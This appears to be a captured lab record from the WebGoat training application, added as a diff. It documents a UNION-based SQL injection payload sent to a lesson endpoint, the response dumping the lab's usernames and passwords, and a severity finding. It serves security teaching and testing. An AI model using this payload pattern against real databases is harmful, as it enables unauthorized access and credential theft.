@@ -1,0 +1,42 @@
+Lesson: SQL Injection (advanced) / assignment SqlInjectionLesson6a ("Try It! Pulling data from other tables")
+Captured via Chrome DevTools Network panel (live browser interaction), Run #9, 2026-11-16T11:19:07Z
+
+### Request
+POST http://10.242.10.31:8007/WebGoat/SqlInjectionAdvanced/attack6a HTTP/1.1
+Referer: http://10.242.10.31:8007/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 127
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+Origin: http://10.242.10.31:8007
+Host: 10.242.10.31:8007
+
+userid_6a=nonexistent'+UNION+SELECT+userid%2C+user_name%2C+password%2C+cookie%2C+NULL%2C+NULL%2C+NULL+FROM+user_system_data+--+
+
+(decoded: userid_6a=nonexistent' UNION SELECT userid, user_name, password, cookie, NULL, NULL, NULL FROM user_system_data -- )
+
+### Response
+HTTP/1.1 200
+Content-Type: application/json
+Content-Length: 778
+
+{
+  "assignment" : "SqlInjectionLesson6a",
+  "attemptWasMade" : true,
+  "feedback" : "You have succeeded: <p>USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
+  101, jsnow, passwd1, , null, null, null, 102, jdoe, passwd2, , null, null, null, 103, jplane, passwd3, ,
+  null, null, null, 104, jeff, jeff, , null, null, null, 105, dave, passW0rD, , null, null, null, </p>Well done!",
+  "lessonCompleted" : true,
+  "output" : "Your query was: SELECT * FROM user_data WHERE last_name = 'nonexistent' UNION SELECT userid,
+  user_name, password, cookie, NULL, NULL, NULL FROM user_system_data -- '"
+}
+
+### Analysis (finding F-SQLI-06)
+UNION-based SQL injection: by padding a UNION SELECT with NULLs to match the victim query's column count,
+data was pulled from an ENTIRELY DIFFERENT table (user_system_data) than the one the input field was designed
+to query (user_data), disclosing plaintext usernames and passwords for 5 accounts (including dave/passW0rD)
+that have no relationship to the original "last name lookup" feature at all. This demonstrates that SQL
+injection impact is not bounded by the apparent purpose of the vulnerable field - any table the DB user can
+read is exposed.
+Severity: HIGH per Section 3j rubric - full sensitive-data exfiltration without RCE (cross-table credential
+dump via UNION-based SQLi, ASVS V1.2.4).
